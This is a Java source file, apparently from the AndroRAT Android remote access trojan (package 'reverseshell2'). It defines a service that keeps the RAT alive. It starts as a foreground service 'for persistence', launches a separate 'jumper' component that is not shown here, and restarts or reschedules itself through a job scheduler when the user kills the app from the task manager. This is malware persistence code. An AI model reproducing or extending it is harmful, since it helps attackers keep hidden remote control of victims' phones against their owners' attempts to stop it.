package com.example.reverseshell2;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class mainService extends Service {
    static String TAG ="mainServiceClass";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,"in");
        // Start as foreground service for persistence
        startForegroundServiceWithNotification();
        new jumper(getApplicationContext()).init();
        return START_STICKY;
    }

    private void startForegroundServiceWithNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            new functions(null).createNotiChannel(getApplicationContext());
        }
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        Notification notification = new NotificationCompat.Builder(this, "channelid")
                .setContentTitle("Service Running")
                .setContentText("AndroRAT is active")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
        startForeground(1, notification);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Reschedule service/job if killed from task manager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            new functions(null).jobScheduler(getApplicationContext());
        } else {
            Intent restartService = new Intent(getApplicationContext(), mainService.class);
            restartService.setPackage(getPackageName());
            startService(restartService);
        }
        super.onTaskRemoved(rootIntent);
    }
}
